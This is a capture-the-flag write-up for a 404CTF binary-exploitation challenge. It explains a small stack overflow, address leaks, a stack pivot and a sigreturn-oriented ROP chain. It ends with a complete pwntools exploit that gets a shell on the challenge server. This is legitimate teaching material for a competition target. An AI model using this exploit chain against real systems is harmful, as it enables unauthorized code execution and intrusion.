# 404CTF - 22 bytes pour sauver l'univers

**Points:** 366 \
**Category:** Pwn

---

## TL;DR

[This challenges makes use of an initial limited Stack Buffer overflow, pivoting and SIGROP to get shell execution.]

---

## Provided files:
- **chall** : ELF binary that receives strings and simply outputs them.

  
![Checksec](https://github.com/MohandAcherir/Writeups/blob/main/404CTF/Screenshot%20from%202025-07-15%2012-19-28.png)


## The binary's code:

Let's examine the binary's code :

```
   0x000000000000038b <+0>:	push   rbp
   0x000000000000038c <+1>:	mov    rbp,rsp
   0x000000000000038f <+4>:	sub    rsp,0x20
   0x0000000000000393 <+8>:	lea    rax,[rip+0xcf6]        # 0x1090
   0x000000000000039a <+15>:	mov    rdi,rax
   0x000000000000039d <+18>:	call   0x334 <puts>
   0x00000000000003a2 <+23>:	mov    DWORD PTR [rbp-0x4],0x1
   0x00000000000003a9 <+30>:	jmp    0x427 <main+156>
   0x00000000000003ab <+32>:	lea    rax,[rip+0xd3d]        # 0x10ef
   0x00000000000003b2 <+39>:	mov    rdi,rax
   0x00000000000003b5 <+42>:	call   0x334 <puts>
   0x00000000000003ba <+47>:	lea    rax,[rip+0xd48]        # 0x1109
   0x00000000000003c1 <+54>:	mov    rdi,rax
   0x00000000000003c4 <+57>:	call   0x334 <puts>
   0x00000000000003c9 <+62>:	lea    rax,[rbp-0x20]
   0x00000000000003cd <+66>:	mov    edx,0x2e
   0x00000000000003d2 <+71>:	mov    rsi,rax
   0x00000000000003d5 <+74>:	mov    edi,0x0
   0x00000000000003da <+79>:	call   0x369 <read>
   0x00000000000003df <+84>:	lea    rax,[rip+0xd27]        # 0x110d
   0x00000000000003e6 <+91>:	mov    rdi,rax
   0x00000000000003e9 <+94>:	call   0x334 <puts>
   0x00000000000003ee <+99>:	lea    rax,[rip+0xd33]        # 0x1128
   0x00000000000003f5 <+106>:	mov    rdi,rax
   0x00000000000003f8 <+109>:	call   0x334 <puts>
   0x00000000000003fd <+114>:	lea    rax,[rbp-0x20]
   0x0000000000000401 <+118>:	mov    rdi,rax
   0x0000000000000404 <+121>:	call   0x334 <puts>
   0x0000000000000409 <+126>:	lea    rax,[rip+0xd40]        # 0x1150
   0x0000000000000410 <+133>:	mov    rdi,rax
   0x0000000000000413 <+136>:	call   0x334 <puts>
   0x0000000000000418 <+141>:	lea    rax,[rip+0xd71]        # 0x1190
   0x000000000000041f <+148>:	mov    rdi,rax
   0x0000000000000422 <+151>:	call   0x334 <puts>
   0x0000000000000427 <+156>:	movzx  eax,BYTE PTR [rbp-0x4]
   0x000000000000042b <+160>:	test   al,al
   0x000000000000042d <+162>:	jne    0x3ab <main+32>
   0x0000000000000433 <+168>:	mov    eax,0x0
   0x0000000000000438 <+173>:	leave
   0x0000000000000439 <+174>:	ret
```

Basically, the binary reads inputs from stdin, and displays it immediately after, nothing complicated. This loops until the provided input has length 32 and finishes with a `\x00`.

IMAGE

## The Vulnerability :
The vulnerability is fairly obvious looking at lines between 62 and 79:
```   
   0x00000000000003c9 <+62>:	lea    rax,[rbp-0x20]
   0x00000000000003cd <+66>:	mov    edx,0x2e
   0x00000000000003d2 <+71>:	mov    rsi,rax
   0x00000000000003d5 <+74>:	mov    edi,0x0
   0x00000000000003da <+79>:	call   0x369 <read>
```
The buffer length is supposed to be `32`, yet we can read up to `46` characters. So, we have a buffer overflow.


## Initial Analysis
The binary is statically linked, so no libc calls possible, or any `onegadget` trick.
Further more, we can not overwrite the stack beyond the RIP backup.

We also need a stack leak, and a .text leak, so that we can pivot and use gadgets.

## Stage 1: Leaks

First off, we need stack and code leaks, and to do that we can leak the saved RBP and the saved RIP for stack and code leaks respectively.

``` 
    for i in range(22, 45):
    data = p.recv()
    if i == 32 or i == 40:
        print(f"FOR I = {i}")
        print(data)
        addrs.append(extract(data))
    p.sendline(b"a"*(i))
```

By sending 32 bytes (e.g: 32 "a"), and because `read(...)` doesn't append a nullbyte character after writing, we can display the `"a"` and all that comes after until it until the nullbyte is reached; this allowed leaking the saved RBP which is the base pointer the `_start` stack frame, and the saved RIP which an instruction in `_start` after `main()` is completed.

Thus, now, we can use the binary's stack memory and gadgets.

## Stage 2: Analyzing the gadgets and exploitation strategy

Here are the best gadgets we're given:
```
gadget 0:
   0x0000000000000364 : syscall

gadget 1:
   0x0000000000000377 <+14>:	mov    edi,DWORD PTR [rbp-0x4]
   0x000000000000037a <+17>:	mov    rsi,QWORD PTR [rbp-0x10]
   0x000000000000037e <+21>:	mov    edx,DWORD PTR [rbp-0x8]
   0x0000000000000381 <+24>:	mov    eax,0x0
   0x0000000000000386 <+29>:	syscall
   0x0000000000000388 <+31>:	nop
   0x0000000000000389 <+32>:	pop    rbp
   0x000000000000038a <+33>:	ret
   

gadget 2:
   0x000000000000034c <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000000350 <+28>:	mov    edi,0x1
   0x0000000000000355 <+33>:	mov    rsi,QWORD PTR [rbp-0x18]
   0x0000000000000359 <+37>:	mov    rax,QWORD PTR [rbp-0x8]  
   0x000000000000035d <+41>:	mov    edx,eax
   0x000000000000035f <+43>:	mov    eax,0x1
   0x0000000000000364 <+48>:	syscall
   0x0000000000000366 <+50>:	nop
   0x0000000000000367 <+51>:	leave
   0x0000000000000368 <+52>:	ret

gadget 3:
   0x000000000000032e : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret`

gadget 4:
   0x000000000000041f <+148>:	mov    rdi,rax
   0x0000000000000422 <+151>:	call   0x334 <puts>
   0x0000000000000427 <+156>:	movzx  eax,BYTE PTR [rbp-0x4]
   0x000000000000042b <+160>:	test   al,al
   0x000000000000042d <+162>:	jne    0x3ab <main+32>
   0x0000000000000433 <+168>:	mov    eax,0x0
   0x0000000000000438 <+173>:	leave
   0x0000000000000439 <+174>:	ret
```

The exploit could have been easier if we had a gadget that allows to call the EXECVE syscall. But, unfortunalety, only 2 syscalls are available: READ and **SIGROP**. 

### Exploitation path:
- Pivot the stack to the original buffer so that we can have control over it's content.
- Using the right gadget, call the READ syscall in order to read more data into the buffer (SIGROP data).
- Set up the registers to call SIGROP and get a shell


## Stage 3: Stack pivoting

As, mentioned before, stack pivoting is used to get more controlled space for our ROP, and the buffer we have control over is the perfect place to pivot into.

Basically, pivoting is changing the value of `RSP`, so that the `POP` and `PUSH` instructions are done in the buffer we pivot to; we can do that using one of these gadgets:
```leave; ret;``` , ```mov rsp, [anything]```, ```pop rsp``` (rare).

But the best, and the far most common one, is ```leave; ret;```, and that's what i used for this challenge.

```
0x0000000000000367 <+51>:	leave
0x0000000000000368 <+52>:	ret
```
Here's the exploit's snippet that does that:
```
x = 13
payload = p64(fake_rbp_1+32) + p64(set_read) + p64(fake_rbp_1+x) + b"\x40\x01\x00\x00" + b"\x00\x00\x00\x00" # ignore this part for now
payload =+ p64(fake_rbp_1) + p64(leave_ret) # Pivoting into `fake_rbp_1` with `leave_ret`
print(f"[+] Send payload of length {hex(len(payload))}")

# `fake_rbp_1` is just the calculated buffer address, nothing fancy 
```

## Stage 4: Setup the stack

We're now inside the buffer, and thus we can ROP as much as we like.

Let's rewind and analyze the first part of payload we saw earlier:
```x = 13
payload = p64(fake_rbp_1+32) + p64(set_read) + p64(fake_rbp_1+x) + b"\x40\x01\x00\x00" + b"\x00\x00\x00\x00"
```
Just after the stack pivot, i.e ```mov rsp, rbp```, there's two more instructions:

```
pop rbp
ret
```

So, the new `RBP = &buffer + 32`, and it returns to `set_read` which is:
```
   0x0000000000000377 <+14>:	mov    edi,DWORD PTR [rbp-0x4]
   0x000000000000037a <+17>:	mov    rsi,QWORD PTR [rbp-0x10]
   0x000000000000037e <+21>:	mov    edx,DWORD PTR [rbp-0x8]
   0x0000000000000381 <+24>:	mov    eax,0x0
   0x0000000000000386 <+29>:	syscall
   0x0000000000000388 <+31>:	nop
   0x0000000000000389 <+32>:	pop    rbp
   0x000000000000038a <+33>:	ret
```

In a nutshell, this made:
- `rdi` is 0 (stdin).
- `rsi` contains the address to write into : `&buffer + 16`
- `rdx` has the number of bytes to read which is `0x140` here.

Thus, now we can extends our buffer without meaningful data.


## Stage 5: SIGROP

But, what data to read ?

Remember, we still have got to get a shell, and for that the only choice we have is **SIGROP**.
So, what's SIGROP ?

SIGROP is an exploitation technique that abuses Unix signal handling to achieve arbitrary register control. It consists of pushing the (future)values of all registers into the stack in a certain order, and after triggering the syscall, all the registers are update based on the values pushed into the stack.

### Attack Process:

Craft fake sigcontext structure:

```
Stack Layout:\
+------------------+\
| Fake sigcontext  |  ← Contains malicious register values\
| RAX = 0x3b       |    (execve syscall number)\
| RDI = "/bin/sh"  |    (program to execute)\
| RSI = NULL       |    (argv)\
| RDX = NULL       |    (envp)\
| RIP = syscall    |    (where to jump)\
+------------------+
```
Triggering it:
```
mov rax, 15    ; SYS_rt_sigreturn
syscall        ; Kernel restores our fake context
```

So, we have to read the new values we want for the registers, especially: **rax**, **rdi**, **rsi** and **rdx**.

```
frame = SigreturnFrame()
frame.rax = 59                      # syscall number for execve
frame.rdi = fake_rbp_1+296            # pointer to "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr            # address of `syscall` instruction
frame.rsp = fake_rbp_1         # stack after syscall (can be just garbage)


payload = p64(fake_rbp_1+40) + p64(set_rax) + p64(15) + p64(syscall_addr) + bytes(frame) + b"/bin/sh\x00"
```

This payload allows to set up the `rax` register to `15` which is the syscal number of Sigrop.
Pwntools gives us a nice easy way to setup the `sigcontext` structure with `SigreturnFrame()`.

And now, all we have to do after pushing this structure and the string `"/bin/sh"` to return to the instruction `syscall`:
```
gadget 0:
   0x0000000000000364 : syscall
```

And get a shell.

![PoC](https://github.com/MohandAcherir/Writeups/blob/main/404CTF/Screenshot%20from%202025-05-28%2016-43-38.png)


### Proof of Concept

```
from pwn import *
import re
from time import sleep

context.arch = 'amd64'
context.os = 'linux'


def extract(data):
    parts = data.split(b'22 derniers bytes : ')
    if len(parts) >= 2:
        after_leak = parts[1]
        leaked = after_leak.split(b'\n')[1][:6]  # first full line after leak
        print(f"Leaked bytes: {leaked}")
        print(f"As address: 0x{int.from_bytes(leaked, 'little'):012x}")
        return int.from_bytes(leaked, 'little')
    else:
        print("Leak pattern not found.")
    return addrs

for x in [48]:
	for y in range(1):
	    for z in range(1):
	        p = remote('challenges.404ctf.fr', 32468)
	        #p = process('./chall')

	        addrs = []
	        for i in range(22, 45):
	            data = p.recv()
	            if i == 32 or i == 40:
		            print(f"FOR I = {i}")
		            print(data)
		            addrs.append(extract(data))
	            p.sendline(b"a"*(i))

	        print(f"RECV # 1 {p.recv()}")
	        print(addrs)

	        #gdb.attach(p, gdbscript='''
	        #b read
	        #''')
	        try:
	            main_offset = 0x443
	            base_addr = addrs[1] - 0x443
	            leave_ret = base_addr + 0x0000000000000367
	            set_read = base_addr + 0x377
	            syscall_addr = base_addr + 0x364
	            set_rax = base_addr + 0x32e

	            print(f"leave ret gadget : {hex(leave_ret)}")
	            print(f"set read gadget : {hex(set_read)}")
	            print(f"X X X X X X = {x}")
	            fake_rbp_1 = addrs[0] - x
	            print(f"base rbp : {hex(fake_rbp_1)}")
	            #gdb.attach(p, gdbscript='q')
	            payload = p64(fake_rbp_1+32) + p64(set_read) + p64(fake_rbp_1+15) + b"\x40\x01\x00\x00" + b"\x00\x00\x00\x00" + p64(fake_rbp_1) + bytes([p64(leave_ret)[0]]) + bytes([p64(leave_ret)[1]]) + bytes([p64(leave_ret)[2]]) + bytes([p64(leave_ret)[3]]) + bytes([p64(leave_ret)[4]]) + bytes([p64(leave_ret)[5]])
	            print(f"[+] Send payload of length {hex(len(payload))}")
	        
	        except:
	            continue
	        
	        frame = SigreturnFrame()
	        frame.rax = 59                      # syscall number for execve
	        frame.rdi = fake_rbp_1+296          # pointer to "/bin/sh"
	        frame.rsi = 0
	        frame.rdx = 0
	        frame.rip = syscall_addr            # address of `syscall` instruction
	        frame.rsp = fake_rbp_1         # stack after syscall (can be just garbage)
	        try:
	            payload = p64(fake_rbp_1+32) + p64(set_read) + p64(fake_rbp_1+16) + b"\x40\x01\x00\x00" + b"\x00\x00\x00\x00" + p64(fake_rbp_1) + bytes([p64(leave_ret)[0]]) + bytes([p64(leave_ret)[1]]) + bytes([p64(leave_ret)[2]]) + bytes([p64(leave_ret)[3]]) + bytes([p64(leave_ret)[4]]) + bytes([p64(leave_ret)[5]])
	            print(f"[+] Send payload of length {hex(len(payload))}")
	            payload += p64(fake_rbp_1+40) + p64(set_rax) + p64(15) + p64(syscall_addr) + bytes(frame) + b"/bin/sh\x00"
	            #payload += b"\x00"*(0x140-len(payload)-3)
	            p.sendline(payload)
	        except:
	            pass    
	        p.interactive()
	        p.close()


"""
gadget 0:
   0x0000000000000364 : syscall

gadget 1:
   0x0000000000000377 <+14>:	mov    edi,DWORD PTR [rbp-0x4]
   0x000000000000037a <+17>:	mov    rsi,QWORD PTR [rbp-0x10]
   0x000000000000037e <+21>:	mov    edx,DWORD PTR [rbp-0x8]
   0x0000000000000381 <+24>:	mov    eax,0x0
   0x0000000000000386 <+29>:	syscall
   0x0000000000000388 <+31>:	nop
   0x0000000000000389 <+32>:	pop    rbp
   0x000000000000038a <+33>:	ret
   

gadget 2:
   0x000000000000034c <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000000350 <+28>:	mov    edi,0x1
   0x0000000000000355 <+33>:	mov    rsi,QWORD PTR [rbp-0x18]
   0x0000000000000359 <+37>:	mov    rax,QWORD PTR [rbp-0x8]  
   0x000000000000035d <+41>:	mov    edx,eax
   0x000000000000035f <+43>:	mov    eax,0x1
   0x0000000000000364 <+48>:	syscall
   0x0000000000000366 <+50>:	nop
   0x0000000000000367 <+51>:	leave
   0x0000000000000368 <+52>:	ret

gadget 3:
   0x000000000000032e : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret`

gadget 4:
   0x000000000000041f <+148>:	mov    rdi,rax
   0x0000000000000422 <+151>:	call   0x334 <puts>
   0x0000000000000427 <+156>:	movzx  eax,BYTE PTR [rbp-0x4]
   0x000000000000042b <+160>:	test   al,al
   0x000000000000042d <+162>:	jne    0x3ab <main+32>
   0x0000000000000433 <+168>:	mov    eax,0x0
   0x0000000000000438 <+173>:	leave
   0x0000000000000439 <+174>:	ret


"""

```



